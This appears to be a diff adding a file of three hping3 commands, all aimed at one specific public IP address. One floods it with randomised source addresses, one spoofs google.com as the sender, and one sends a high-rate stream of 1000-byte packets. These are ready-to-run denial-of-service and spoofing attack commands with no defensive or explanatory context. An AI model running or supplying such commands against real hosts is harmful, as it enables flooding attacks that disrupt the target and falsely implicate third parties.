@@ -1,0 +1,5 @@
+hping3 178.128.232.201 --count 10000 --flood --rand-source
+
+hping3 178.128.232.201 --count 9000 --interval u1000 --spoof google.com
+
+hping3 178.128.232.201 --count 11000 --interval u7500 --data 1000
